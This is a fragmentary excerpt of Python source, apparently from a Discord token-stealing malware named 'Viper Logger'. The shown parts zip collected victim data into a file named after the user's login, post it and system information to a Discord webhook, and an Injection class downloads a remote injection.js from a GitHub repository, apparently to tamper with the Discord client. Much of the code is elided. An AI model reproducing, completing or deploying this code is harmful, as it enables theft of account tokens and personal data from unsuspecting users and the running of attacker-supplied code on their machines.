...
def main(webhook: str):
    ...
    _file = None
    _file = File(f'{localappdata}\\Viper-Logged-{os.getlogin()}.zip')
    ...
    webhook.send(content=content, file=_file, avatar_url="https://media.discordapp.net/attachments/1052700491164950614/1052704726493442170/R.png?width=569&height=427", username="Viper")

    PcInfo()
    Discord()


def Viper(webhook: str):
    Debug()
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="Viper Logger", color=5639644)
        ...
        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Viper")
...
def zipup():
    ...
    _zipfile = os.path.join(localappdata, f'Viper-Logged-{os.getlogin()}.zip')
...
class Injection:
    def __init__(self, webhook: str):
        ...
        self.code = requests.get("https://raw.githubusercontent.com/Smug246/Viper-Token-Grabber/main/injection.js").text
